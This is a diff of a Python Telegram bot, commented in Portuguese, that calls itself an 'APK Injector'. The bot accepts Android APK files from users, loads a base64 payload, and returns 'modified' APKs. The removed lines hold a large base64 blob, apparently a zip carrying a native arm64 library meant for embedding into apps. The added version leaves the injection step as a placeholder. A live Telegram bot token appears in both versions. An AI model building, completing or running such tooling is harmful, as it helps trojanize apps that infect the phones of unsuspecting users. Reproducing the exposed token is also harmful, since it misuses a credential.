@@ -1,14 +1,168 @@
 import os
-import zipfile
-import tempfile
-import shutil
 import logging
 import base64
 import subprocess
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters
+import tempfile
+import shutil
+from pathlib import Path
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
+from telegram.constants import ParseMode
 
-TELEGRAM_TOKEN = "8673484762:AAG52YGWBfZlgl_rBQ3VrdmICxayMf59v8A"
+# ==================== CONFIGURAÇÃO ====================
+TOKEN =  "8673484762:AAG52YGWBfZlgl_rBQ3VrdmICxayMf59v8A" # ← COLOQUE SEU TOKEN AQUI
+PAYLOAD_FILE = "payload.b64"
 
-# ===== PAYLOAD EMBUTIDO (BASE64 DO ARQUIVO) =====
-PAYLOAD_B64 = """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
+# ==================== LOGGING ====================
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# ==================== FUNÇÃO PARA CARREGAR PAYLOAD ====================
+def load_payload():
+    """Carrega o payload do arquivo externo"""
+    try:
+        if not os.path.exists(PAYLOAD_FILE):
+            logger.error(f"❌ Arquivo não encontrado: {PAYLOAD_FILE}")
+            return None
+        
+        with open(PAYLOAD_FILE, 'r', encoding='utf-8') as f:
+            base64_content = f.read().strip()
+        
+        if not base64_content:
+            logger.error("❌ Arquivo vazio")
+            return None
+        
+        payload_bytes = base64.b64decode(base64_content)
+        logger.info(f"✅ Payload carregado: {len(payload_bytes)} bytes")
+        return payload_bytes
+        
+    except Exception as e:
+        logger.error(f"❌ Erro: {e}")
+        return None
+
+# Carrega o payload
+PAYLOAD = load_payload()
+
+# ==================== VERIFICAÇÃO ====================
+def check_payload():
+    return PAYLOAD is not None
+
+# ==================== COMANDOS ====================
+async def start(update: Update, context: CallbackContext):
+    status = "✅" if check_payload() else "❌"
+    
+    keyboard = [
+        [InlineKeyboardButton("📤 Enviar APK", callback_data='send_apk')],
+        [InlineKeyboardButton("ℹ️ Status", callback_data='status')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        f"🤖 Bot APK Injector\n"
+        f"Status payload: {status}\n\n"
+        f"Envie um APK para processar.",
+        reply_markup=reply_markup
+    )
+
+async def status(update: Update, context: CallbackContext):
+    if not check_payload():
+        await update.message.reply_text(
+            "❌ PAYLOAD NÃO ENCONTRADO!\n\n"
+            "O arquivo payload.b64 não está no servidor.\n"
+            "Contate o administrador."
+        )
+        return
+    
+    tamanho = len(PAYLOAD) / (1024 * 1024)
+    await update.message.reply_text(
+        f"✅ Sistema OK\n"
+        f"📦 Payload: {tamanho:.2f} MB\n"
+        f"📁 Arquivo: {PAYLOAD_FILE}"
+    )
+
+async def handle_apk(update: Update, context: CallbackContext):
+    if not check_payload():
+        await update.message.reply_text("❌ Payload não disponível!")
+        return
+    
+    if not update.message.document:
+        await update.message.reply_text("❌ Envie um arquivo APK.")
+        return
+    
+    document = update.message.document
+    if not document.file_name.lower().endswith('.apk'):
+        await update.message.reply_text("❌ Envie um arquivo .apk válido.")
+        return
+    
+    await update.message.reply_text("📥 Baixando APK...")
+    
+    try:
+        file = await document.get_file()
+        input_path = tempfile.mktemp(suffix='.apk')
+        await file.download_to_drive(input_path)
+        
+        await update.message.reply_text("🔄 Processando...")
+        
+        # AQUI VOCÊ COLOCA SEU CÓDIGO DE INJEÇÃO REAL
+        # Exemplo:
+        output_path = tempfile.mktemp(suffix='_modified.apk')
+        
+        # Simula processamento (substitua pelo seu código real)
+        import time
+        time.sleep(3)
+        
+        # Copia o arquivo como exemplo
+        shutil.copy2(input_path, output_path)
+        
+        await update.message.reply_text("✅ APK processado!")
+        with open(output_path, 'rb') as f:
+            await update.message.reply_document(
+                document=f,
+                filename=f'modified_{document.file_name}',
+                caption="✅ APK modificado!"
+            )
+        
+        # Limpa arquivos
+        os.remove(input_path)
+        os.remove(output_path)
+        
+    except Exception as e:
+        logger.error(f"Erro: {e}")
+        await update.message.reply_text(f"❌ Erro: {str(e)[:200]}")
+
+async def button_callback(update: Update, context: CallbackContext):
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == 'send_apk':
+        await query.message.reply_text("📤 Envie o arquivo APK.")
+    elif query.data == 'status':
+        await status(update, context)
+
+async def error_handler(update: Update, context: CallbackContext):
+    logger.error(f"Erro: {context.error}")
+
+# ==================== MAIN ====================
+def main():
+    logger.info("🚀 Iniciando bot...")
+    
+    if PAYLOAD is None:
+        logger.warning("⚠️ Payload não carregado!")
+    else:
+        logger.info(f"✅ Payload carregado: {len(PAYLOAD)} bytes")
+    
+    application = Application.builder().token(TOKEN).build()
+    
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
+    application.add_handler(CallbackQueryHandler(button_callback))
+    application.add_error_handler(error_handler)
+    
+    logger.info("✅ Bot rodando...")
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
+
+if __name__ == "__main__":
+    main()
